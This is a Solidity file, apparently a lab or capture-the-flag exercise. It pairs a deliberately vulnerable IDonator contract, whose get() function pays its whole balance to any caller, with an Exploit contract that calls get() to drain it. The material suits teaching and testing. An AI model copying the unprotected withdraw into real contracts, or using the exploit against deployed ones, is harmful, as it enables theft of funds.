pragma solidity 0.8.19;

contract IDonator {
    constructor() payable {}

    function get() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}


contract Exploit {
    address target;
    constructor(address donatorAddress) {
        target = donatorAddress;
    }

    function attack() external {
        IDonator id = IDonator(target);
        id.get();
    }
    receive() external payable {}
}
